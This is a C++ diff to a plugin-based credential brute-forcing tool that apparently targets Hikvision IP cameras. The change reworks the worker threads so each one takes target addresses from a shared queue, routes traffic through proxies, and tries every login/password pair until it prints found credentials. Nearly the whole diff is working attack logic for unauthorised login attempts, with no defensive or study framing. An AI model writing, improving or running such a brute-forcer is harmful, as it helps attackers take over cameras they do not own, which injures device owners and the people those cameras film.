@@ -7,14 +7,15 @@
 #include <filesystem>
 #include <format>
 #include <iostream>
+#include <mutex>
 #include <optional>
 #include <stdexcept>
 #include <string>
+#include <string_view>
 #include <system_error>
 #include <utility>
 #include <vector>
 #include <fstream>
-#include <thread>
 
 namespace adapters::plugin {
 
@@ -45,9 +46,6 @@ Plugin::Plugin(
     
     if (!api->validateAddr)
         throw std::runtime_error("Plugin's 'validateAddr' function does not specified");
-    
-    if (!api->work)
-        throw std::runtime_error("Plugin's 'work' function does not specified");
 }
 
 std::string Plugin::getVersion() const noexcept {
@@ -107,7 +105,7 @@ void Plugin::readData(std::vector<std::string> &v, const std::string &filePath) 
     }
 }
 
-void Plugin::readData(std::vector<Addr>& v, const std::string& filePath) {
+void Plugin::readData(std::queue<Addr>& q, const std::string& filePath) {
     std::ifstream file(filePath);
     if (!file.is_open())
         throw std::runtime_error(std::format("Failed open file: {}", filePath));
@@ -119,7 +117,7 @@ void Plugin::readData(std::vector<Addr>& v, const std::string& filePath) {
         auto res = parseAddr(s);
         if (!res) continue;
 
-        v.emplace_back(res->first, res->second);
+        q.emplace(res->first, res->second);
     }
 }
 
@@ -189,87 +187,55 @@ void Plugin::createOutput(const std::string& dirPathStr) {
 }
 
 void Plugin::work() {
-    size_t const length = inputs.size();
-    size_t const num_threads = std::min(
-        std::min(
-            std::min(
-                length,
-                proxies.size()
-            ),
-            (size_t)threads
-        ),
-        (size_t)MAX_THREAD_COUNT
-    );
-    size_t const block_size = length / num_threads;
-    size_t const remainder = length % num_threads;
+    size_t const num_threads = std::min({
+                                    inputs.size(),
+                                    proxies.size(),
+                                    (size_t)threads,
+                                    (size_t)MAX_THREAD_COUNT});
+    workers.reserve(num_threads);
 
-    std::vector<std::jthread> threads(num_threads);
+    for (size_t i = 0; i < num_threads; i++) {
+        workers.emplace_back([this, i, num_threads]{
+            const __Proxy __proxy = this->proxies.at(i % num_threads).to_c_struct();
 
-    auto block_start = inputs.begin();
+            while (true) {
+                Addr address;
+                {
+                    std::unique_lock<std::mutex> lock(this->mutex);
+                    if (this->inputs.empty() || this->isStopAtomic->load())
+                        return;
+                
+                    address = std::move(this->inputs.front());
+                    this->inputs.pop();
+                }
 
-    size_t i{};
-    for (; i < num_threads - 1; i++) {
-        size_t const step = i < remainder ? block_size + 1 : block_size;
-        auto block_end = block_start;
-        std::advance(block_end, step);
-        threads[i] = std::jthread(
-            &Plugin::brute_wrapper,
-            this,
-            block_start,
-            block_end,
-            proxies.at(i)
-        );
-        block_start = block_end;
-    }
+                std::string_view ip{address.ip};
+                unsigned short port = address.port;
 
-    threads[i] = std::jthread(
-        &Plugin::brute_wrapper,
-        this,
-        block_start,
-        inputs.end(),
-        proxies.at(i)
-    );
-    
-    api->work();
-}
+                if (port == 0) continue; // temp solution without SYN port scan // TODO somewhen
 
-void Plugin::brute(const Addr& addr, const Proxy &proxy) {
-    for (const auto &login : logins) { 
-        for (const auto &password : passwords) {
-            if (isStopAtomic->load()) return;
-            std::cout << "Address: " << addr.ip << ":" << addr.port <<
-                         ". Trying combination: " + login << " " << password << std::endl;
-            if (api->sendRequest(
-                __Addr{addr.ip.c_str(), addr.port},
-                __Proxy{proxy.addr.ip.c_str(), proxy.addr.port, proxy.creds.login.c_str(), proxy.creds.password.c_str()},
-                __Creds{login.c_str(), password.c_str()}
-            )) {
-                // std::cout << "Found valid creds: \n" <<
-                // "Login: " << login << '\n' <<
-                // "Password: " << password << std::endl;
-                Result output{addr.ip, addr.port, login, password};
-                results.emplace_back(output);
-                printResult(output);
-                return;
+                const __Addr __addr = {ip.data(), port};
+
+                if (!api->validateAddr(&__addr)) continue;
+
+                [&]{
+                    for (const std::string_view login : this->logins) {
+                        for (const std::string_view password : this->passwords) {
+                            if (isStopAtomic->load()) return;
+                            std::cout << "[i] Trying combination for address [" << ip << ":" << port << "] " << login << "/" << password << "\n";
+
+                            if (api->sendRequest(&__addr, &__proxy, __Creds{login.data(), password.data()})) {
+                                std::cout << "[+] Found creds for address [" << ip << ":" << port << "] " << login << "/" << password << "\n";
+                                Result output{address.ip, port, std::string(login), std::string(password)};
+                                results.emplace_back(output);
+                                printResult(output);
+                                return;
+                            }
+                        }
+                    }
+                }();
             }
-        }
-    }
-}
-
-void Plugin::brute_wrapper(std::vector<Addr>::iterator begin_addr, std::vector<Addr>::iterator end_addr, const Proxy& proxy) {
-    for (; begin_addr != end_addr && !isStopAtomic->load(); ++begin_addr) {
-        // Temp solution
-        if (begin_addr->port == 0) {
-            std::cout << "Address does not have specified port. Skip for now..." << std::endl;
-            continue;
-        }
-        auto [ip, port] = *begin_addr;
-        if (!api->validateAddr(ip.c_str(), port)) {
-            std::cout << "Address [" << begin_addr->ip << ':' << begin_addr->port << "] does not correspond to hikvision" << std::endl;
-            continue;
-        }
-
-        brute(*begin_addr, proxy);
+        });
     }
 }
 
